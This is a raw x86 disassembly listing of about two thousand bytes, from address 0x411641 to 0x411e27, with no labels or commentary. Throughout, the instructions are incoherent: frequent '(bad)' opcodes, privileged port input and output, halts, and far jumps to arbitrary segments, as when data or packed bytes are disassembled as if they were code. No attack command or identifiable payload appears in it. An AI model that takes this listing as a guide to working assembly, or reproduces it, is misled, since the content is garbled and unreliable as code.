  411641:	add    eax,0x7ce5a842
  411646:	cwde   
  411647:	lea    ecx,[esi]
  411649:	das    
  41164a:	out    0xa7,eax
  41164c:	ins    DWORD PTR es:[edi],dx
  41164d:	push   esp
  41164e:	aaa    
  41164f:	cld    
  411650:	je     0x411631
  411652:	cmp    cl,BYTE PTR [edx+0x41]
  411655:	cmp    BYTE PTR [edx+0x662a3956],al
  41165b:	outs   dx,BYTE PTR ds:[esi]
  41165c:	(bad)  
  41165e:	jb     0x41168e
  411660:	and    al,0x4a
  411662:	dec    esi
  411663:	leave  
  411664:	jg     0x411615
  411666:	sbb    bh,BYTE PTR [ebp+esi*2+0x64793bf5]
  41166d:	jno    0x4116be
  41166f:	shl    BYTE PTR [edx+0xa],0x50
  411673:	xor    bh,BYTE PTR [edi+0x3ab9155f]
  411679:	mov    WORD PTR [ecx+ebx*8],?
  41167c:	aas    
  41167d:	addr16 cwde 
  41167f:	shl    esp,1
  411681:	pop    es
  411682:	or     eax,0x3fcf0643
  411687:	pop    edi
  411688:	clc    
  411689:	leave  
  41168a:	jecxz  0x4116a5
  41168c:	pusha  
  41168d:	pushaw 
  41168f:	cdq    
  411690:	(bad)  
  411691:	ins    DWORD PTR es:[edi],dx
  411692:	sub    dl,BYTE PTR ds:0xe649f87a
  411698:	shl    ch,0xae
  41169b:	(bad)  
  41169c:	mov    al,BYTE PTR [edx+0x1d]
  41169f:	pop    ss
  4116a0:	imul   ebp,DWORD PTR [ebx+0x28],0xffffffca
  4116a4:	or     BYTE PTR [ecx],ah
  4116a6:	fsubr  QWORD PTR [ebp+0x4e036efa]
  4116ac:	ret    0xa9b
  4116af:	push   eax
  4116b0:	ds add al,0x46
  4116b3:	jg     0x41167f
  4116b5:	in     eax,0x3
  4116b7:	cmp    DWORD PTR [eax-0x63a1275e],edx
  4116bd:	loop   0x4116b5
  4116bf:	push   0xfc55996a
  4116c4:	shl    DWORD PTR [edi+ebp*2+0x79],cl
  4116c8:	cli    
  4116c9:	fs nop
  4116cb:	jecxz  0x411671
  4116cd:	sbb    eax,0xec51e4fa
  4116d2:	pop    es
  4116d3:	pop    edx
  4116d4:	dec    ebx
  4116d5:	inc    edx
  4116d6:	in     al,dx
  4116d7:	hlt    
  4116d8:	sub    al,0x4e
  4116da:	(bad)  
  4116db:	jp     0x4116cf
  4116dd:	add    ebp,DWORD PTR [edi+0x66aaa0eb]
  4116e3:	jl     0x41175d
  4116e5:	push   0x12bbb514
  4116ea:	mov    ebp,0xc7a4aa7e
  4116ef:	push   edx
  4116f0:	push   cs
  4116f1:	mov    esp,0xa0f97042
  4116f6:	jle    0x41172b
  4116f8:	mov    al,BYTE PTR [edi+0x1d071a77]
  4116fe:	pop    edx
  4116ff:	outs   dx,DWORD PTR ds:[esi]
  411700:	retf   0xb750
  411703:	mov    ds:0xc449c6f2,al
  411708:	ja     0x4116eb
  41170a:	sbb    DWORD PTR [esi],0xfffffff2
  41170d:	bound  edx,QWORD PTR [ebx+0x5beb8a1a]
  411713:	js     0x41177f
  411715:	out    0x8a,eax
  411717:	mov    cl,BYTE PTR [eax]
  411719:	hlt    
  41171a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41171b:	cs ror BYTE PTR cs:0x81e6041b,0xe3
  411724:	mov    dl,BYTE PTR [edx+0x73f10ab3]
  41172a:	data16 jnp 0x41175d
  41172d:	adc    WORD PTR [ecx+0x2bcbcea1],cx
  411734:	std    
  411735:	sti    
  411736:	xchg   esp,eax
  411737:	xlat   BYTE PTR ds:[ebx]
  411738:	cli    
  411739:	cwde   
  41173a:	pushf  
  41173b:	mov    dh,0x28
  41173d:	xchg   ebp,eax
  41173e:	imul   BYTE PTR [edx+0x65346960]
  411744:	es int3 
  411746:	sub    eax,0xe6f91cf9
  41174b:	and    DWORD PTR [ebp+0xe],esp
  41174e:	repnz sbb dh,BYTE PTR [eax]
  411751:	inc    ebx
  411752:	inc    esp
  411753:	iret   
  411754:	mov    es,WORD PTR [edi]
  411756:	mov    ebp,0x3b1d5374
  41175b:	stc    
  41175c:	sub    BYTE PTR ds:0x291446dd,dh
  411762:	pop    ss
  411763:	cld    
  411764:	cli    
  411765:	scas   eax,DWORD PTR es:[edi]
  411766:	and    ch,BYTE PTR [edx-0xdc0bab0]
  41176c:	dec    edi
  41176d:	shl    ebx,1
  41176f:	mov    al,0x19
  411771:	(bad)  
  411773:	(bad)  
  411774:	mov    WORD PTR [esp+esi*1-0x6c68572d],gs
  41177b:	loop   0x411722
  41177d:	rcl    BYTE PTR [ebp+0x35],0x6f
  411781:	stos   BYTE PTR es:[edi],al
  411782:	imul   ecx,DWORD PTR [ecx-0xc],0xbd6d0a39
  411789:	adc    eax,0xf75e87a5
  41178e:	inc    ebp
  41178f:	mov    WORD PTR [edx-0x1f],fs
  411792:	xchg   edi,eax
  411793:	call   0x10a45566
  411798:	pop    edx
  411799:	nop
  41179a:	jecxz  0x4117a0
  41179c:	shr    ecx,cl
  41179e:	mov    esi,0x343a4b5b
  4117a3:	add    al,BYTE PTR [edi+0x38]
  4117a6:	sbb    esi,DWORD PTR [eax-0x4da73cd0]
  4117ac:	lods   al,BYTE PTR ds:[esi]
  4117ad:	mov    al,ds:0x77f39976
  4117b2:	jle    0x411738
  4117b4:	adc    bl,BYTE PTR [ebx]
  4117b6:	sbb    ch,BYTE PTR [ebx+0x4a321145]
  4117bc:	mov    ds:0x9151f777,eax
  4117c1:	dec    ecx
  4117c2:	(bad)
  4117c5:	cmc    
  4117c6:	gs mov dl,0x8a
  4117c9:	pop    ebp
  4117ca:	imul   ecx,esi,0x912e0b2c
  4117d0:	mov    edx,DWORD PTR [ebx-0x43ef3a4b]
  4117d6:	xor    al,0x90
  4117d8:	int    0x92
  4117da:	hlt    
  4117db:	imul   eax,DWORD PTR [ecx+0x3c7354b3],0x6233941e
  4117e5:	push   ss
  4117e6:	mov    dl,0xc1
  4117e8:	daa    
  4117e9:	out    dx,eax
  4117ea:	xlat   BYTE PTR ds:[ebx]
  4117eb:	fnstcw WORD PTR [edi+ebx*2+0x7f]
  4117ef:	pop    edx
  4117f0:	mov    cl,BYTE PTR [ebx+0x24]
  4117f3:	add    esp,DWORD PTR [edx+0x79]
  4117f6:	push   es
  4117f7:	(bad)  
  4117f9:	test   al,0xa9
  4117fb:	add    al,0x55
  4117fd:	mov    bl,0x4a
  4117ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411800:	ja     0x411801
  411802:	adc    al,0x79
  411804:	rcr    BYTE PTR [ebx],1
  411806:	adc    BYTE PTR [edx],dl
  411808:	sub    eax,0x58fe9a42
  41180d:	dec    ebp
  41180e:	daa    
  41180f:	(bad)  
  411810:	int    0x28
  411812:	push   esi
  411813:	imul   BYTE PTR [edx-0x77]
  411816:	out    dx,eax
  411817:	in     eax,0x90
  411819:	xor    DWORD PTR [ecx+ebp*2],edi
  41181c:	pop    DWORD PTR [ebx+edi*1]
  41181f:	in     eax,dx
  411820:	lahf   
  411821:	fdivr  DWORD PTR [ecx]
  411823:	inc    esp
  411824:	add    dl,BYTE PTR [ecx]
  411826:	cmp    al,0x4b
  411828:	imul   ebx,DWORD PTR [eax+0x10],0x71
  41182c:	xor    dl,BYTE PTR [eax+0x354e857b]
  411832:	and    dl,dl
  411834:	daa    
  411835:	add    DWORD PTR [edi+0x66fc94c],ebp
  41183b:	and    eax,0x9b3c6fe5
  411840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411841:	leave  
  411842:	mov    ds:0x8f71d3a6,eax
  411847:	fadd   st(6),st
  411849:	cmp    BYTE PTR [edi+0x17],bh
  41184c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41184d:	cs mov esp,0x58f265e5
  411853:	loop   0x4118cd
  411855:	sahf   
  411856:	in     al,0xaa
  411858:	inc    eax
  411859:	adc    ch,cl
  41185b:	push   ecx
  41185c:	cwde   
  41185d:	popa   
  41185e:	inc    ecx
  41185f:	out    0x3c,eax
  411861:	(bad)  
  411862:	test   BYTE PTR [eax+0x0],al
  411865:	cdq    
  411866:	inc    ebx
  411867:	and    dl,ch
  411869:	(bad)  
  41186b:	sti    
  41186c:	frstor [esi-0x7e]
  41186f:	cmp    ebp,DWORD PTR [ecx+0x7037a183]
  411875:	inc    ebx
  411876:	ret    
  411877:	mov    ch,0x7
  411879:	dec    esi
  41187a:	fist   DWORD PTR [edx-0x46]
  41187d:	and    bh,cl
  41187f:	call   0xe13e2d8d
  411884:	inc    esp
  411885:	in     eax,0x85
  411887:	ret    0xf972
  41188a:	lahf   
  41188b:	adc    BYTE PTR [esp+edi*8-0x1f],ah
  41188f:	fs push es
  411891:	dec    BYTE PTR [eax-0x37]
  411894:	sti    
  411895:	inc    esp
  411896:	jbe    0x41183e
  411898:	ror    BYTE PTR [eax-0x17],1
  41189b:	in     al,0x25
  41189d:	mov    DWORD PTR [esi+0x5e],ebx
  4118a0:	mov    ebp,0xf184f6be
  4118a5:	jg     0x411829
  4118a7:	leave  
  4118a8:	and    edi,ecx
  4118aa:	das    
  4118ab:	repz out 0x4,eax
  4118ae:	push   ebp
  4118af:	jmp    0xbd75:0xe0ee0f54
  4118b6:	inc    ebp
  4118b7:	cmp    DWORD PTR [ebp-0x46],edi
  4118ba:	push   ebp
  4118bb:	push   edx
  4118bc:	dec    ecx
  4118bd:	adc    DWORD PTR [ecx-0x52a1e8],eax
  4118c3:	dec    edi
  4118c4:	daa    
  4118c5:	cmp    al,0x88
  4118c7:	cmp    DWORD PTR [ecx+0x5e0ed50a],ebx
  4118cd:	add    BYTE PTR [esi],cl
  4118cf:	in     al,0x72
  4118d1:	dec    ebx
  4118d2:	adc    al,0x2d
  4118d4:	and    BYTE PTR [edx],ah
  4118d6:	jmp    0x5bcf6cab
  4118db:	push   ds
  4118dc:	and    al,0xb2
  4118de:	fs and cl,dl
  4118e1:	enter  0x1be,0x5c
  4118e5:	xchg   ebp,eax
  4118e6:	repnz std 
  4118e8:	sar    BYTE PTR [edi+0x7764d836],0x45
  4118ef:	gs dec esi
  4118f1:	out    0xfa,ax
  4118f4:	mov    edx,0xda88fe69
  4118f9:	(bad)  
  4118fa:	mov    al,0x14
  4118fc:	clc    
  4118fd:	clc    
  4118fe:	inc    esi
  4118ff:	ret    
  411900:	imul   esp,DWORD PTR [ebp-0x7e],0x6b
  411904:	arpl   WORD PTR [edi],sp
  411906:	push   0x32
  411908:	pop    esp
  411909:	push   ebp
  41190a:	imul   eax,DWORD PTR [edi-0x7c5de978],0xffffffc0
  411911:	cmp    al,0xc9
  411913:	ficom  DWORD PTR [ebx]
  411915:	jecxz  0x41197d
  411917:	or     BYTE PTR [eax],bl
  411919:	mov    edx,0x39fa11d9
  41191e:	mov    ds:0xb07f2aea,al
  411923:	adc    al,0xe8
  411925:	nop
  411926:	xor    eax,0x17ca0159
  41192c:	in     al,0xb5
  41192e:	enter  0x9437,0xd3
  411932:	jl     0x41190d
  411934:	cwde   
  411935:	jo     0x411971
  411937:	inc    ecx
  411938:	and    BYTE PTR [ebp+0x62d47dc7],dl
  41193e:	mov    esi,0x693c924b
  411943:	mov    WORD PTR [edi+edx*1+0x6ad80e70],fs
  41194a:	sub    ebp,DWORD PTR [ebx-0x3f]
  41194d:	or     cl,dl
  41194f:	cdq    
  411950:	gs ret 0xcd28
  411954:	pop    esi
  411955:	mov    ds:0x55f1de7d,al
  41195a:	int3   
  41195b:	or     al,al
  41195d:	push   es
  41195e:	jp     0x411942
  411960:	idiv   BYTE PTR [edi+0x61eab69a]
  411966:	out    dx,eax
  411967:	push   esi
  411968:	popa   
  411969:	and    al,0x66
  41196b:	(bad)  
  41196c:	and    BYTE PTR [bx+si],cl
  41196f:	xchg   DWORD PTR [ebx],ebp
  411971:	and    al,0x67
  411973:	pop    edx
  411974:	popf   
  411975:	clc    
  411976:	mov    eax,ds:0x160e31d1
  41197b:	sub    al,0x1f
  41197d:	cmp    BYTE PTR [edi-0x27],ah
  411980:	pop    ds
  411981:	lock and BYTE PTR [eax],0xa8
  411985:	xchg   ebp,eax
  411986:	in     al,dx
  411987:	xor    al,0xab
  411989:	push   ds
  41198a:	xchg   edi,eax
  41198b:	stos   DWORD PTR es:[edi],eax
  41198c:	fadd   QWORD PTR [edx]
  41198e:	(bad)  
  41198f:	lock aad 0xcd
  411992:	dec    esi
  411993:	adc    cl,ch
  411995:	pusha  
  411996:	xor    bl,0x8f
  411999:	xchg   BYTE PTR [esi],cl
  41199b:	sbb    ah,bl
  41199d:	repnz loope 0x41198a
  4119a0:	dec    esp
  4119a1:	and    ebx,DWORD PTR [ebp+edi*2+0x59]
  4119a5:	pop    ds
  4119a6:	xchg   esi,eax
  4119a7:	sub    edi,DWORD PTR [ecx+0x1652e70f]
  4119ad:	dec    esi
  4119ae:	mov    ebp,DWORD PTR [ebp+ebp*4-0x14de21b7]
  4119b5:	or     al,BYTE PTR [ebx-0x1d60792f]
  4119bb:	shl    BYTE PTR [edx-0x739df3bf],1
  4119c1:	and    BYTE PTR [ebx-0x7be0f5f],al
  4119c7:	jmp    0x47df:0xc5b3b82c
  4119ce:	pop    ebx
  4119cf:	xlat   BYTE PTR ds:[ebx]
  4119d0:	jb     0x4119d6
  4119d2:	jmp    DWORD PTR [ebx-0x7d079f1d]
  4119d8:	daa    
  4119d9:	gs sbb al,0x25
  4119dc:	pushf  
  4119dd:	mov    cl,0x57
  4119df:	mov    fs,WORD PTR [edi-0x67da5477]
  4119e5:	adc    eax,DWORD PTR [edi-0x67]
  4119e8:	int3   
  4119e9:	inc    esp
  4119ea:	(bad)  
  4119eb:	in     al,0xe5
  4119ed:	mov    bh,0xe4
  4119ef:	and    al,0xe6
  4119f1:	jle    0x411977
  4119f3:	inc    edi
  4119f4:	push   edx
  4119f5:	add    esi,edi
  4119f7:	lea    eax,[edi+0x68]
  4119fa:	jg     0x4119f2
  4119fc:	popa   
  4119fd:	mov    ch,dh
  4119ff:	or     edx,DWORD PTR [edi+0x269cd8e8]
  411a05:	rol    BYTE PTR [ebp+0x361e8212],0x4c
  411a0c:	mov    ah,0xa
  411a0e:	adc    al,0xcc
  411a10:	leave  
  411a11:	jae    0x411a2c
  411a13:	push   ebx
  411a14:	imul   eax,ebp,0x18e743e5
  411a1a:	in     eax,0x32
  411a1c:	adc    BYTE PTR [eax-0x5a],ch
  411a1f:	jecxz  0x411a61
  411a21:	cld    
  411a22:	mov    ds:0xad8228ca,eax
  411a27:	mov    ds:0xa91917c6,al
  411a2c:	ret    
  411a2d:	loopne 0x411a80
  411a2f:	xor    BYTE PTR [eax-0x78],ch
  411a32:	std    
  411a33:	mov    al,ds:0x47af83ad
  411a38:	add    bh,BYTE PTR [ecx+0x28]
  411a3b:	cmp    eax,0xd8469561
  411a40:	test   eax,0x5aeb5d4c
  411a45:	add    edx,ecx
  411a47:	aad    0x6e
  411a49:	fisttp QWORD PTR [ecx-0x40a43bf0]
  411a4f:	push   es
  411a50:	rol    DWORD PTR [edi+0x34],cl
  411a53:	sbb    al,bh
  411a55:	or     eax,0x80570099
  411a5a:	test   DWORD PTR [ebx],0x12b42e41
  411a60:	outs   dx,DWORD PTR ds:[esi]
  411a61:	jo     0x411a35
  411a63:	(bad)  
  411a65:	jge    0x411a4f
  411a67:	and    BYTE PTR cs:[eax],0xe2
  411a6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a6c:	mov    BYTE PTR [esi+0x7a],dh
  411a6f:	fwait
  411a70:	js     0x4119f8
  411a72:	mov    ecx,0x9fa10d75
  411a77:	rcr    DWORD PTR [eax-0x28f45552],1
  411a7d:	push   cs
  411a7e:	jb     0x411a3d
  411a80:	es sti 
  411a82:	mov    dh,0xd3
  411a84:	pop    ds
  411a85:	or     DWORD PTR [esi-0x56b276fa],esp
  411a8b:	les    ebx,FWORD PTR [eax+ebx*4]
  411a8e:	add    DWORD PTR [edx],0xbc2e9ba6
  411a94:	inc    ebx
  411a95:	xchg   edi,eax
  411a96:	and    ecx,edx
  411a98:	fwait
  411a99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a9a:	outs   dx,BYTE PTR ds:[esi]
  411a9b:	hlt    
  411a9c:	and    edx,eax
  411a9e:	fstp   DWORD PTR [edi]
  411aa0:	pop    ebp
  411aa1:	jg     0x411ab2
  411aa3:	and    esi,DWORD PTR [ecx-0x1d]
  411aa6:	jle    0x411b15
  411aa8:	scas   al,BYTE PTR es:[edi]
  411aa9:	ja     0x411b07
  411aab:	mov    al,ds:0x22423d12
  411ab0:	mov    ch,0xb2
  411ab2:	jecxz  0x411ac0
  411ab4:	xchg   esp,edi
  411ab6:	mov    ah,0x35
  411ab8:	shl    BYTE PTR [ebx-0x5b9798dd],1
  411abe:	stc    
  411abf:	adc    al,0xc
  411ac1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ac2:	mov    edx,0x5bbabd9e
  411ac7:	mov    ebp,ebp
  411ac9:	sbb    ecx,DWORD PTR [ebp+0x492d06f7]
  411acf:	pushf  
  411ad0:	in     eax,dx
  411ad1:	or     BYTE PTR [ecx+0x6c7857f7],ah
  411ad7:	cli    
  411ad8:	std    
  411ad9:	push   ds
  411ada:	xchg   ebp,eax
  411adb:	sub    al,0xc6
  411add:	xchg   BYTE PTR [esi-0x6a],bh
  411ae0:	or     ebx,DWORD PTR [eax+edi*4+0x65]
  411ae4:	retf   0xbdc7
  411ae7:	xchg   ecx,eax
  411ae8:	mov    ah,0x2a
  411aea:	dec    ebx
  411aeb:	arpl   WORD PTR ds:0xc24a4e57,sp
  411af1:	dec    ecx
  411af2:	adc    al,bl
  411af4:	dec    edx
  411af5:	rol    ah,1
  411af7:	and    edi,esi
  411af9:	imul   esi,DWORD PTR [ecx-0x67726580],0xaf6ef087
  411b03:	aas    
  411b04:	movlps QWORD PTR [esi-0x53],xmm2
  411b08:	inc    edx
  411b09:	push   esi
  411b0a:	outs   dx,BYTE PTR ds:[esi]
  411b0b:	xor    eax,0x30273dd8
  411b10:	xchg   edi,eax
  411b11:	jmp    0x4290:0xa4a0ec3f
  411b18:	sti    
  411b19:	sbb    DWORD PTR ds:0xa7807b5c,edx
  411b1f:	dec    esp
  411b20:	add    eax,0x2112a0e2
  411b25:	cmp    eax,DWORD PTR [ecx]
  411b27:	out    dx,al
  411b28:	(bad)  
  411b29:	call   0x5de0:0x1fa99b23
  411b30:	cmp    BYTE PTR [ebx+0x69af9392],0x4b
  411b37:	inc    ebx
  411b38:	mov    edi,0xe23b9cca
  411b3d:	int    0x92
  411b3f:	mov    bl,cl
  411b41:	pop    ecx
  411b42:	sbb    cl,ch
  411b44:	mov    bl,0x2d
  411b46:	inc    ebx
  411b47:	cld    
  411b48:	adc    dl,cl
  411b4a:	pop    es
  411b4b:	js     0x411b39
  411b4d:	jmp    0xc80ab3ba
  411b52:	shl    edx,1
  411b54:	fsubr  DWORD PTR [ebx-0x757eac3f]
  411b5a:	xor    al,0xd6
  411b5c:	dec    ebx
  411b5d:	daa    
  411b5e:	inc    esp
  411b5f:	nop
  411b60:	pop    edx
  411b61:	out    0xc,al
  411b63:	das    
  411b64:	or     bh,ch
  411b66:	das    
  411b67:	or     ah,BYTE PTR [edx]
  411b69:	jle    0x411b30
  411b6b:	ret    0x790f
  411b6e:	aam    0x8
  411b70:	jg     0x411b42
  411b72:	mov    ah,0x72
  411b74:	mov    cl,0x56
  411b76:	iret   
  411b77:	xchg   esp,eax
  411b78:	push   eax
  411b79:	test   al,0x2f
  411b7b:	out    dx,al
  411b7c:	ret    0xe477
  411b7f:	lea    edx,[ebp+0x3982a274]
  411b85:	fwait
  411b86:	adc    al,0x7a
  411b88:	aas    
  411b89:	popf   
  411b8a:	mov    ss,WORD PTR [ecx+ebx*2+0x16d2f35a]
  411b91:	sub    esi,DWORD PTR ds:0x21e5eee9
  411b97:	test   BYTE PTR [ecx],0x92
  411b9a:	jns    0x411b61
  411b9c:	pushf  
  411b9d:	dec    ecx
  411b9e:	popa   
  411b9f:	xor    al,0x8b
  411ba1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ba2:	pop    es
  411ba3:	aam    0xb1
  411ba5:	lahf   
  411ba6:	dec    ebp
  411ba7:	fld    st(6)
  411ba9:	xor    al,0xc9
  411bab:	mov    cl,0x37
  411bad:	pop    edi
  411bae:	push   0xe31ef78e
  411bb3:	cmp    al,0x6b
  411bb5:	test   eax,0x988bc393
  411bba:	sti    
  411bbb:	inc    eax
  411bbc:	or     dh,BYTE PTR [esi-0x65ea9e03]
  411bc2:	jl     0x411b77
  411bc4:	sub    DWORD PTR [ecx-0x53c754f9],edi
  411bca:	mov    al,0x6e
  411bcc:	mov    ds:0xfc33900c,eax
  411bd1:	xor    al,BYTE PTR [eax-0x2]
  411bd4:	fnstsw WORD PTR [esi+0x6be055ab]
  411bda:	test   edi,esi
  411bdc:	jmp    0x411c3f
  411bde:	cld    
  411bdf:	imul   esp,edi,0x79
  411be2:	ins    DWORD PTR es:[edi],dx
  411be3:	sub    eax,0xd03b2bfd
  411be8:	ret    
  411be9:	sbb    al,0xb9
  411beb:	cwde   
  411bec:	xor    al,0xb0
  411bee:	loope  0x411bef
  411bf0:	push   ds
  411bf1:	retf   0x3b06
  411bf4:	call   0x9bff:0xce9e0d25
  411bfb:	inc    eax
  411bfc:	fs or  eax,0xa16c06d2
  411c02:	pop    ds
  411c03:	clc    
  411c04:	out    0x7d,eax
  411c06:	loopne 0x411c4d
  411c08:	scas   eax,DWORD PTR es:[edi]
  411c09:	ror    DWORD PTR [eax-0x68],0xa0
  411c0d:	popf   
  411c0e:	retf   
  411c0f:	jmp    0x76ca:0x74b308f8
  411c16:	outs   dx,DWORD PTR ds:[esi]
  411c17:	xor    BYTE PTR [edi-0x63f80fc0],dl
  411c1d:	pop    ds
  411c1e:	jo     0x411c27
  411c20:	jno    0x411bd3
  411c22:	sub    DWORD PTR [esi+0x64],esi
  411c25:	mov    al,0x9a
  411c27:	fbstp  TBYTE PTR [edx+0x37c9f590]
  411c2e:	adc    eax,esi
  411c30:	jbe    0x411bce
  411c32:	loope  0x411c0f
  411c34:	inc    eax
  411c35:	fdivr  QWORD PTR ds:0x6206ea8e
  411c3b:	(bad)  
  411c3c:	(bad)  
  411c3e:	pusha  
  411c3f:	in     al,dx
  411c40:	sbb    edx,ecx
  411c42:	mov    eax,ds:0xa53ce6a3
  411c47:	pop    ebx
  411c48:	jno    0x411c20
  411c4a:	pop    ecx
  411c4b:	xchg   ebp,eax
  411c4c:	lahf   
  411c4d:	mov    bh,0xd0
  411c4f:	addr16 mov eax,ds:0x2f6e
  411c53:	cmp    eax,0xcaf26479
  411c58:	xchg   DWORD PTR [esi+0x2f],edi
  411c5b:	mov    ecx,0x2a3ba43b
  411c60:	and    eax,0x6300ca4
  411c65:	adc    DWORD PTR [ebx],edx
  411c67:	lds    ecx,FWORD PTR [esi+0x54]
  411c6a:	adc    al,0xc3
  411c6c:	popf   
  411c6d:	fld    TBYTE PTR [ecx+0x43]
  411c70:	inc    edi
  411c71:	add    bh,BYTE PTR [ebx+0x1f30e08b]
  411c77:	nop
  411c78:	sbb    cl,ch
  411c7a:	push   DWORD PTR ds:[edx-0x7e]
  411c7e:	(bad)  
  411c7f:	(bad)  
  411c80:	mov    cl,0x5f
  411c82:	or     ch,0xb8
  411c85:	cdq    
  411c86:	outs   dx,DWORD PTR ds:[esi]
  411c87:	lock pushf 
  411c89:	mov    ch,0xe0
  411c8b:	push   edx
  411c8c:	fucomi st,st(7)
  411c8e:	hlt    
  411c8f:	inc    edi
  411c90:	mov    cl,bl
  411c92:	test   eax,0xe2ff9608
  411c97:	mov    al,ds:0xe5192d3f
  411c9c:	mov    esp,DWORD PTR [ecx-0x6dd97d05]
  411ca2:	mov    ecx,0xce135adc
  411ca7:	mov    ebx,0x85faf7d1
  411cac:	mov    ebp,DWORD PTR [esi+0x6e]
  411caf:	ror    BYTE PTR [ecx],0x64
  411cb2:	jle    0x411cf8
  411cb4:	inc    esp
  411cb5:	mov    al,0xbc
  411cb7:	mov    gs,WORD PTR [ebx]
  411cb9:	xchg   ebp,eax
  411cba:	mov    BYTE PTR [ecx-0x51178953],bh
  411cc0:	dec    esi
  411cc1:	aad    0x59
  411cc3:	or     BYTE PTR [edx+0x34f0eeb7],ch
  411cc9:	mov    ebx,0xd12cd424
  411cce:	or     esi,DWORD PTR [esi]
  411cd0:	in     al,dx
  411cd1:	push   ss
  411cd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411cd3:	jecxz  0x411ce2
  411cd5:	sub    eax,0xfceee143
  411cda:	mov    DWORD PTR [edi-0x69ccb658],edx
  411ce0:	pop    ds
  411ce1:	mov    ebp,esp
  411ce3:	lock clc 
  411ce5:	outs   dx,BYTE PTR ds:[esi]
  411ce6:	pop    ss
  411ce7:	test   DWORD PTR [edi-0x3f],esp
  411cea:	stos   DWORD PTR es:[edi],eax
  411ceb:	mov    ah,0x7
  411ced:	ins    BYTE PTR es:[edi],dx
  411cee:	aas    
  411cef:	mov    edi,esp
  411cf1:	push   ss
  411cf2:	push   ss
  411cf3:	rcr    dh,1
  411cf5:	ror    BYTE PTR [esi+0x5b3a94a0],cl
  411cfb:	mov    ecx,0x89a1cdb
  411d00:	push   esi
  411d01:	std    
  411d02:	sub    BYTE PTR [edx+0x1692bc45],bl
  411d08:	cmp    DWORD PTR [edi],esp
  411d0a:	aas    
  411d0b:	int3   
  411d0c:	mov    ds:0x9fb2a445,al
  411d11:	dec    eax
  411d12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d13:	je     0x411cc7
  411d15:	jo     0x411cb1
  411d17:	addr16 loope 0x411d01
  411d1a:	retf   
  411d1b:	jge    0x411d5a
  411d1d:	xor    esp,edi
  411d1f:	jecxz  0x411cba
  411d21:	test   BYTE PTR [eax-0x60],0x3d
  411d25:	out    dx,al
  411d26:	jns    0x411d83
  411d28:	mul    BYTE PTR [eax+0x2]
  411d2b:	repz pop esp
  411d2d:	std    
  411d2e:	push   edi
  411d2f:	mov    dl,0x16
  411d31:	jp     0x411d40
  411d33:	dec    ecx
  411d34:	fsubr  DWORD PTR ds:0xe56ee978
  411d3a:	xor    al,0xb4
  411d3c:	call   0x1eef2313
  411d41:	pop    edx
  411d42:	les    ebx,FWORD PTR [edx-0x6d]
  411d45:	test   BYTE PTR [ebp+0x21fcd45b],ah
  411d4b:	mov    WORD PTR ds:0x9bca0b18,ds
  411d51:	in     eax,0xd1
  411d53:	call   0x8586:0x3b3ac41d
  411d5a:	and    bl,BYTE PTR [eax]
  411d5c:	in     al,dx
  411d5d:	scas   eax,DWORD PTR es:[edi]
  411d5e:	cmc    
  411d5f:	dec    esp
  411d60:	or     al,0xab
  411d62:	mov    dh,0x34
  411d64:	call   0xe0e0:0x29320d55
  411d6b:	xchg   esp,eax
  411d6c:	in     al,0xac
  411d6e:	test   eax,0x3f2b4be1
  411d73:	xor    DWORD PTR [ebp+0x29298081],edi
  411d79:	jae    0x411d18
  411d7b:	daa    
  411d7c:	push   es
  411d7d:	jb     0x411d13
  411d7f:	sti    
  411d80:	xor    ah,BYTE PTR [ebp-0x5aaa3403]
  411d86:	ffreep st(4)
  411d88:	xor    BYTE PTR es:[esi],0x2f
  411d8c:	retf   0xfa14
  411d8f:	pop    ecx
  411d90:	pop    es
  411d91:	daa    
  411d92:	xor    eax,ebx
  411d94:	pusha  
  411d95:	test   al,0x96
  411d97:	inc    edi
  411d98:	sub    al,0x82
  411d9a:	dec    edx
  411d9b:	adc    DWORD PTR [ebp+ecx*1+0x3dc854df],0xffffff9a
  411da3:	sbb    BYTE PTR [ebx+eax*2-0x77],dh
  411da7:	push   esp
  411da8:	adc    bh,al
  411daa:	dec    edi
  411dab:	loopne 0x411dee
  411dad:	lock and eax,edi
  411db0:	xor    DWORD PTR [edx],esp
  411db2:	mov    cl,0xa
  411db4:	xor    eax,DWORD PTR [esi+ebp*2-0x6728aac]
  411dbb:	popf   
  411dbc:	or     dh,dh
  411dbe:	mov    edi,0x76fcfa7e
  411dc3:	jne    0x411dd1
  411dc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411dc6:	ret    0xc38
  411dc9:	xor    DWORD PTR [ecx+0x26],edx
  411dcc:	(bad)
  411dcf:	(bad)  
  411dd0:	sbb    eax,0x27ff1b23
  411dd5:	call   0x2871:0xd6c20bc6
  411ddc:	sbb    dl,ch
  411dde:	ror    BYTE PTR [edi],cl
  411de0:	pop    ds
  411de1:	lds    edx,FWORD PTR [esi]
  411de3:	push   eax
  411de4:	lahf   
  411de5:	aaa    
  411de6:	jle    0x411d68
  411de8:	push   0x49
  411dea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411deb:	pop    edx
  411dec:	inc    eax
  411ded:	int    0xb9
  411def:	mov    ecx,0xea8da4bc
  411df4:	imul   esi,DWORD PTR [ebx],0x6e
  411df7:	cmp    eax,0x94972613
  411dfc:	pushf  
  411dfd:	or     eax,0xa670918
  411e02:	test   al,0xd9
  411e04:	dec    ebx
  411e05:	cmp    al,0xc2
  411e07:	scas   al,BYTE PTR es:[edi]
  411e08:	xchg   esi,eax
  411e09:	aaa    
  411e0a:	loopne 0x411dac
  411e0c:	ret    
  411e0d:	or     BYTE PTR [esi-0x28291e01],dh
  411e13:	dec    ebx
  411e14:	push   esi
  411e15:	cs lahf 
  411e17:	and    DWORD PTR [di+0x59],edx
  411e1b:	and    BYTE PTR cs:[ebx+0x74],0x8f
  411e20:	sar    ebp,1
  411e22:	into   
  411e23:	mov    ch,0x3e
  411e25:	pop    edi
  411e26:	xchg   edx,eax
  411e27:	xchg   ecx,eax
